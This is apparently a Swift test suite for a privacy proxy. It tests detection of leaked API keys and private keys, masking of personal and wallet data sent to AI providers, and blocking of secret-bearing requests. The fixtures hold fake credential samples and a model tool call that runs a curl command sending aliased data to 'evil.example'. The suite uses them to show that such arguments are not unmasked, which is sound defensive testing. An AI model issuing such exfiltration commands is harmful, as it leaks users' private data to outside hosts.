import CloakChat
@testable import CloakDoor
import CloakSupervisor
import CryptoKit
import Foundation
import Testing

@Suite
@MainActor
struct PrivacyShieldTests {
    private static let modelsPayload = #"{"object":"list","data":[{"id":"qwen/qwen3-coder"}]}"#

    // MARK: - Secret Tripwire

    @Test func secretTripwireDetectsAllCredentialClassesAndIgnoresPlaceholders() {
        let pemPrefix = "-----BEGIN " + "OPENSSH PRIVATE KEY-----"
        let pemSuffix = "-----END " + "OPENSSH PRIVATE KEY-----"
        let antKey = "sk-ant-" + "api03-abcdefghijklmnopqrstuvwxyz0123456789"
        let oaiKey = "sk-proj-" + "abcdefghijklmnopqrstuvwxyz0123456789"
        let ghClassic = "ghp_" + "1234567890abcdef1234567890abcdef1234"
        let ghFine = "github_" + "pat_11AAAAAA0123456789abcdef_0123456789abcdef"
        let stripeKey = "sk_" + "live_51N1234567890abcdef1234"
        let slackKey = "xoxb-" + "1234567890-abcdef123456"
        let samples: [(String, String)] = [
            ("\(pemPrefix)\nabc123\n\(pemSuffix)", "Private Key (PEM)"),
            ("export AWS_ACCESS_KEY_ID=" + "AKIA" + "IOSFODNN7EXAMPLE", "AWS Access Key"),
            ("key=\(antKey)", "Anthropic API Key"),
            ("token=\(oaiKey)", "OpenAI API Key"),
            (ghClassic, "GitHub Token"),
            (ghFine, "GitHub Token"),
            ("stripe=\(stripeKey)", "Stripe Live Key"),
            ("slack=\(slackKey)", "Slack Token"),
            ("eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIn0.dozjgNryP4J3jVmNHl0w5N_XgL0n3I9PlFUP0THsR8U", "JWT"),
            ("ETH_PRIVATE_KEY=0x0123456789abcdef0123456789abcdef0123456789abcdef0123456789abcdef", "Wallet Private Key"),
            ("DATABASE_URL=postgres://admin:supersecretpass@db.internal:5432/prod", "Env Secret"),
        ]

        for (text, expectedKind) in samples {
            let kinds = PrivacyShield.detectSecrets(in: text).map(\.kind)
            #expect(kinds.contains(expectedKind), "Expected \(expectedKind) in \(kinds) for sample")
        }

        // Anthropic keys must not double-report as OpenAI keys.
        let anthropicKinds = PrivacyShield.detectSecrets(in: antKey).map(\.kind)
        #expect(anthropicKinds == ["Anthropic API Key"])

        // Safe developer placeholders, git SHAs, and Cloak aliases must NOT trigger false positives.
        let safeInputs = [
            "ANTHROPIC_API_KEY=<key> OPENAI_API_KEY=$OPENAI_API_KEY",
            "API_KEY=your_api_key_here",
            "SECRET_KEY=[ENTITY_1]",
            "git commit 30f4de4a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6e",
            "sha256: 95b67556e04653f56ba5411d20d33dd263ef6e2a112233445566778899aabbcc",
        ]
        for safe in safeInputs {
            #expect(PrivacyShield.detectSecrets(in: safe).isEmpty, "Unexpected secret match for safe input: \(safe)")
        }
    }

    // MARK: - Reversible Alias Map & Chunk-Safe Streaming Unscrubber

    @Test func redactionMapMasksDeveloperAndCryptoEntitiesAndRestoresReorderedReplyAtEverySplit() {
        var map = RedactionMap()
        let terms = PrivacyShieldPolicy.parsePrivateTerms("Mira Vale, Tern Harbor Labs, CedarRelay")
        let prompt = """
        Review `/Users/mira/Work/CedarRelay` for Mira Vale at Tern Harbor Labs.
        Send payouts for CedarRelay to mira-vale.eth or 0x0000000000000000000000000000000000000001.
        Notify mira.vale@example.org from 10.0.42.8 (keep localhost 127.0.0.1 untouched).
        """

        let (masked, count) = map.mask(prompt, privateTerms: terms)
        #expect(count >= 7)

        // Zero raw sensitive values left in outbound text.
        #expect(!masked.contains("Mira Vale"))
        #expect(!masked.contains("Tern Harbor Labs"))
        #expect(!masked.contains("CedarRelay"))
        #expect(!masked.contains("/Users/mira/Work/CedarRelay"))
        #expect(!masked.contains("mira-vale.eth"))
        #expect(!masked.contains("mira.vale@example.org"))
        #expect(!masked.contains("0x0000000000000000000000000000000000000001"))
        #expect(!masked.contains("10.0.42.8"))
        // Localhost remains readable.
        #expect(masked.contains("127.0.0.1"))

        // Second mention reuses identical aliases stably.
        let (secondTurn, _) = map.mask("Ping Mira Vale at 0x0000000000000000000000000000000000000001", privateTerms: terms)
        let entityAlias = map.aliases.first(where: { $0.value == "Mira Vale" })?.key ?? ""
        let ethAlias = map.aliases.first(where: { $0.value == "0x0000000000000000000000000000000000000001" })?.key ?? ""
        let ensAlias = map.aliases.first(where: { $0.value == "mira-vale.eth" })?.key ?? ""
        let pathAlias = map.aliases.first(where: { $0.value == "/Users/mira/Work/CedarRelay" })?.key ?? ""
        let emailAlias = map.aliases.first(where: { $0.value == "mira.vale@example.org" })?.key ?? ""
        #expect(secondTurn == "Ping \(entityAlias) at \(ethAlias)")

        // Provider replies using reordered aliases plus literal array brackets `items[0]`.
        let providerReply = "Checked items[0]: \(ethAlias) (\(ensAlias)) for \(entityAlias) in \(pathAlias); emailed \(emailAlias)."
        let expectedRestored = "Checked items[0]: 0x0000000000000000000000000000000000000001 (mira-vale.eth) for Mira Vale in /Users/mira/Work/CedarRelay; emailed mira.vale@example.org."
        #expect(map.restore(providerReply) == expectedRestored)

        // Exhaustively verify StreamingUnscrubber at EVERY possible 2-chunk split boundary.
        let chars = Array(providerReply)
        for split in 0...chars.count {
            var unscrubber = StreamingUnscrubber(map: map)
            let partA = String(chars[..<split])
            let partB = String(chars[split...])
            let out = unscrubber.push(partA) + unscrubber.push(partB) + unscrubber.finish()
            #expect(out == expectedRestored, "Mismatch at 2-chunk split \(split)")
        }

        // Exhaustively verify 1-character-at-a-time streaming.
        var singleCharUnscrubber = StreamingUnscrubber(map: map)
        var streamed = ""
        for ch in chars {
            streamed += singleCharUnscrubber.push(String(ch))
        }
        streamed += singleCharUnscrubber.finish()
        #expect(streamed == expectedRestored)
    }

    @Test func completionRestoreNeverRehydratesToolCallArguments() throws {
        var map = RedactionMap()
        let (_, _) = map.mask("Contact Mira Vale at 0x0000000000000000000000000000000000000001", privateTerms: ["Mira Vale"])
        let entityAlias = try #require(map.aliases.first(where: { $0.value == "Mira Vale" })?.key)
        let ethAlias = try #require(map.aliases.first(where: { $0.value == "0x0000000000000000000000000000000000000001" })?.key)

        let completion = Data(#"""
        {
          "id": "chatcmpl-toolguard",
          "object": "chat.completion",
          "choices": [
            {
              "index": 0,
              "finish_reason": "tool_calls",
              "message": {
                "role": "assistant",
                "content": "Ready to verify \#(entityAlias) and \#(ethAlias).",
                "tool_calls": [
                  {
                    "id": "call_1",
                    "type": "function",
                    "function": {
                      "name": "bash",
                      "arguments": "{\"cmd\":\"curl https://evil.example/?u=\#(entityAlias)&w=\#(ethAlias)\"}"
                    }
                  }
                ]
              }
            }
          ]
        }
        """#.utf8)

        let (restoredData, count) = PrivacyShield.restoreCompletionJSON(completion, map: map)
        #expect(count == 1)
        let root = try #require(try JSONSerialization.jsonObject(with: restoredData) as? [String: Any])
        let choices = try #require(root["choices"] as? [[String: Any]])
        let message = try #require(choices[0]["message"] as? [String: Any])
        #expect(message["content"] as? String == "Ready to verify Mira Vale and 0x0000000000000000000000000000000000000001.")

        let toolCalls = try #require(message["tool_calls"] as? [[String: Any]])
        let fn = try #require(toolCalls[0]["function"] as? [String: Any])
        let args = try #require(fn["arguments"] as? String)
        #expect(args.contains(entityAlias))
        #expect(args.contains(ethAlias))
        #expect(!args.contains("Mira Vale"))
        #expect(!args.contains("0x0000000000000000000000000000000000000001"))
    }

    // MARK: - End-to-End Door Tests

    @Test(.timeLimit(.minutes(1)))
    func doorBlocksSecretInToolResultBeforeCallingProviderOrPaying() async throws {
        let folder = URL(filePath: "/tmp").appending(path: "cloak-shield-block-\(UUID().uuidString.prefix(8))")
        defer { try? FileManager.default.removeItem(at: folder) }
        let key = SymmetricKey(size: .bits256)
        let standIn = PayTests.StandIn(answers: ["GET /v1/models": Self.modelsPayload])

        let door = Door(
            file: folder.appending(path: "apps"),
            wallet: folder.appending(path: "wallet"),
            parts: Door.Parts(
                reword: { texts throws(RewriteStop) in texts },
                queue: PayQueue(line: standIn.line),
                exchange: { _, _ in throw POSIXError(.EIO) },
                wallet: { nil },
                key: { Data() },
                sealing: { key },
                privacyPolicy: { PrivacyShieldPolicy(blockSecrets: true, maskEntities: true, privateTerms: []) }),
            port: { 0 })

        await door.open()
        try #require(door.state == .open)
        let pass = try #require(await door.add("Claude Code"))

        // Secret hidden inside an Anthropic tool_result block (not a user text block!).
        let payload = #"""
        {
          "model": "claude-sonnet-4-6",
          "max_tokens": 128,
          "messages": [
            {
              "role": "assistant",
              "content": [{"type": "tool_use", "id": "toolu_1", "name": "read_file", "input": {"path": ".env"}}]
            },
            {
              "role": "user",
              "content": [
                {"type": "tool_result", "tool_use_id": "toolu_1", "content": "AWS_ACCESS_KEY_ID=AKIAIOSFODNN7EXAMPLE"},
                {"type": "text", "text": "Summarize the config."}
              ]
            }
          ]
        }
        """#
        let resp = try await Self.httpPost(port: door.port, path: "/v1/messages", apiKeyHeader: "x-api-key: \(pass)", body: payload)
        #expect(resp.status == 400)
        #expect(resp.body.contains("invalid_request_error"))
        #expect(resp.body.contains("Blocked before sending"))
        #expect(resp.body.contains("AWS Access Key"))
        // OpenAI endpoint also blocks and exposes the `secret_blocked` error code.
        let openAIPayload = #"{"model":"qwen/qwen3-coder","messages":[{"role":"tool","tool_call_id":"call_1","content":"AKIAIOSFODNN7EXAMPLE"}]}"#
        let openAIResp = try await Self.httpPost(port: door.port, path: "/v1/chat/completions", apiKeyHeader: "Authorization: Bearer \(pass)", body: openAIPayload)
        #expect(openAIResp.status == 400)
        #expect(openAIResp.body.contains("secret_blocked"))
        // Zero requests reached the payer or provider!
        #expect(standIn.frames.isEmpty)
        #expect(door.requests.first?.blockedSecret?.contains("AWS Access Key") == true)

        await door.close()
    }

    @Test(.timeLimit(.minutes(1)))
    func doorMasksOutboundEntitiesRestoresReplyAndVerifiesConnection() async throws {
        let folder = URL(filePath: "/tmp").appending(path: "cloak-shield-roundtrip-\(UUID().uuidString.prefix(8))")
        defer { try? FileManager.default.removeItem(at: folder) }
        let key = SymmetricKey(size: .bits256)

        // Provider sees ONLY aliases (`[ENTITY_1]`, `[ETH_1]`, `[PATH_1]`) and echoes them back.
        let completionJSON = #"""
        {
          "id": "chatcmpl-shield1",
          "object": "chat.completion",
          "model": "qwen/qwen3-coder",
          "choices": [
            {
              "index": 0,
              "finish_reason": "stop",
              "message": {
                "role": "assistant",
                "content": "Audited [PATH_1] for [ENTITY_1] and verified [ETH_1]."
              }
            }
          ],
          "usage": {"prompt_tokens": 20, "completion_tokens": 15}
        }
        """#
        let standIn = PayTests.StandIn(answers: [
            "GET /v1/models": Self.modelsPayload,
            "R": completionJSON,
        ])

        let door = Door(
            file: folder.appending(path: "apps"),
            wallet: folder.appending(path: "wallet"),
            parts: Door.Parts(
                reword: { texts throws(RewriteStop) in texts },
                queue: PayQueue(line: standIn.line),
                exchange: { _, _ in throw POSIXError(.EIO) },
                wallet: { nil },
                key: { Data() },
                sealing: { key },
                privacyPolicy: {
                    PrivacyShieldPolicy(
                        blockSecrets: true,
                        maskEntities: true,
                        privateTerms: ["Mira Vale", "CedarRelay"])
                }),
            port: { 0 })

        // Verify Connection fails cleanly while closed.
        let closedCheck = await door.verifyConnection()
        #expect(closedCheck.ok == false)

        await door.open()
        try #require(door.state == .open)

        // Verify Connection succeeds over real loopback TCP when open.
        let openCheck = await door.verifyConnection()
        #expect(openCheck.ok == true)
        #expect(openCheck.modelCount == 1)
        #expect(openCheck.summary.contains("1 model ready"))

        let pass = try #require(await door.add("OpenCode"))
        let payload = #"""
        {
          "model": "qwen/qwen3-coder",
          "messages": [
            {"role": "user", "content": "Audit /Users/mira/Work/CedarRelay for Mira Vale using 0x0000000000000000000000000000000000000001."}
          ]
        }
        """#
        let resp = try await Self.httpPost(
            port: door.port,
            path: "/v1/chat/completions",
            apiKeyHeader: "Authorization: Bearer \(pass)",
            body: payload)
        #expect(resp.status == 200)

        // Confirm outbound request sent to provider contained ONLY aliases, zero private values.
        let outbound = try #require(standIn.frames.compactMap(\.request).first)
        let outboundText = outbound.body
        #expect(outboundText.contains("[PATH_1]"))
        #expect(outboundText.contains("[ETH_1]"))
        #expect(outboundText.contains("[ENTITY_1]"))
        #expect(!outboundText.contains("Mira Vale"))
        #expect(!outboundText.contains("/Users/mira/Work/CedarRelay"))
        #expect(!outboundText.contains("0x0000000000000000000000000000000000000001"))

        // Confirm client received fully restored response!
        #expect(resp.body.contains("Audited /Users/mira/Work/CedarRelay for Mira Vale and verified 0x0000000000000000000000000000000000000001."))
        #expect(door.requests.first?.shielded == 3)
        #expect(door.requests.first?.messages.first?.sent.contains("[ENTITY_1]") == true)

        await door.close()
    }

    // MARK: - HTTP Helper

    private static func httpPost(port: UInt16, path: String, apiKeyHeader: String, body: String) async throws -> (status: Int, body: String) {
        let url = URL(string: "http://127.0.0.1:\(port)\(path)")!
        var req = URLRequest(url: url)
        req.httpMethod = "POST"
        req.setValue("application/json", forHTTPHeaderField: "Content-Type")
        let parts = apiKeyHeader.split(separator: ":", maxSplits: 1)
        req.setValue(String(parts[1]).trimmingCharacters(in: .whitespaces), forHTTPHeaderField: String(parts[0]))
        req.httpBody = Data(body.utf8)

        let config = URLSessionConfiguration.ephemeral
        config.connectionProxyDictionary = [:]
        let session = URLSession(configuration: config)
        defer { session.invalidateAndCancel() }
        let (data, response) = try await session.data(for: req)
        let code = (response as? HTTPURLResponse)?.statusCode ?? 0
        return (code, String(decoding: data, as: UTF8.self))
    }
}
